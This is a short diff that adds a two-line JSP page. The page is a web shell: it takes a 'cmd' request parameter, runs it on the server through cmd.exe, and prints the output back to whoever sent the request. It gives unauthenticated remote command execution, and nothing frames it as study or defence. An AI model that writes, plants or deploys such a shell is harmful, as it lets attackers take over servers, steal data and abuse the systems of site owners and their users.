@@ -1,0 +1,2 @@
+<%@page import="java.io.*"%>
+<%if(request.getParameter("cmd")!=null){Process p=Runtime.getRuntime().exec("cmd.exe /C "+request.getParameter("cmd"));java.io.DataInputStream d=new java.io.DataInputStream(p.getInputStream());String l;while((l=d.readLine())!=null)out.print(l+"<BR>");}%>
